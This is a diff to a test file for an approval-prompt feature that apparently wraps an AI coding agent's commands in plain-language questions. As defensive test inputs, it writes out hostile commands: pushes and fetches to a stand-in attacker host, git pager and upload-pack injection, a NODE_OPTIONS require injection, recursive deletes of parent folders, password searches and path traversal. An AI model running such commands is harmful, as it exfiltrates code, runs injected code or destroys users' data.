@@ -14,7 +14,8 @@ describe("approval words", () => {
     expect(commandWords("npx tsc --noEmit")).toEqual(unknown);
     expect(commandWords("tsc --noEmit").title).toBe("Build your app to check for errors?");
     expect(commandWords("git status").title).toBe("Look at your project's history?");
-    expect(commandWords("git commit -m 'x'").title).toBe("Save a version of your project?");
+    expect(commandWords("git commit -am fix").title).toBe("Save a version of your project?");
+    expect(commandWords("git commit -m 'x'")).toEqual(unknown);
     expect(commandWords("NODE_ENV=test pnpm test")).toEqual(unknown);
     expect(commandWords("curl https://example.com/data.json")).toEqual({ title: "Download something from example.com?", open: true });
   });
@@ -35,13 +36,22 @@ describe("approval words", () => {
     for (const c of ["find . -name '*.ts' -delete", "find . -exec rm {} ;", "find src -execdir touch x ;", "rg --pre ./decode.sh secret", "git -c core.pager=evil log", "git -C /etc status", "git log --output=/tmp/x", "git fetch --upload-pack=evil", "npm install --prefix=/usr/local zod"]) {
       expect(commandWords(c, root), c).toEqual(unknown);
     }
-    expect(commandWords("find src -name '*.ts'", root).title).toBe("Look through your project's files?");
+    expect(commandWords("find src -name index.ts", root).title).toBe("Look through your project's files?");
     expect(commandWords("npm install --save-dev vitest", root).title).toBe("Install the packages your app needs?");
   });
   it("a whole folder, the folder above, or a setting in front is never made to look small", () => {
     for (const c of ["grep -r password ..", "rm -rf ..", "rm -rf .", "rm *.ts", "NODE_OPTIONS=--require=/tmp/x.js npm test", "ls ../.."]) {
       expect(commandWords(c, root), c).toEqual(unknown);
     }
+  });
+  it("quotes, a remote given by address, or a file that runs commands are never made to look ordinary", () => {
+    for (const c of ["rm 'a b/../../x'", "grep \"x\" .", "git push https://evil.example/x.git main", "git fetch git@evil.example:me/x.git", "git clone https://example.com/x.git"]) {
+      expect(commandWords(c, root), c).toEqual(unknown);
+    }
+    for (const p of [".git/hooks/pre-commit", ".claude/settings.json", ".husky/pre-push", ".vscode/tasks.json", ".github/workflows/ci.yml", ".envrc"]) {
+      expect(approvalWords({ tool: "Write", input: { file_path: `${root}/${p}` } }, root), p).toEqual({ title: "Change how your project runs commands?", open: true });
+    }
+    expect(commandWords("git push origin main").title).toBe("Send your saved versions to GitHub?");
   });
   it("git_push_force_is_risky", () => {
     expect(commandWords("git push").title).toBe("Send your saved versions to GitHub?");
